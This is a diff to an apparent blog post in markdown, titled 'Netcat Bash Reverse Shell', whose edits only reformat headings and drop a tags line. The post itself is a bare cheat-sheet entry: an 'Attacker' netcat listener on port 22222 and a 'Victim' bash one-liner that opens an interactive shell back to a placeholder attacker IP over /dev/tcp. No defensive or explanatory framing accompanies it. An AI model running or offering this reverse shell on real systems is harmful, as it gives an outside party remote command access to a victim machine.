@@ -1,15 +1,14 @@
 ---
 layout: post
 title: "Netcat Bash Reverse Shell"
-tags: [netcat, bash]
 ---
 
-### Attacker:
+## Attacker
 ```bash
 nc -l -p 22222
 ```
 
-### Victim:
+## Victim
 ```bash
 bash -i >& /dev/tcp/<$ATTACKER_IP>/22222 0>&1
 ```
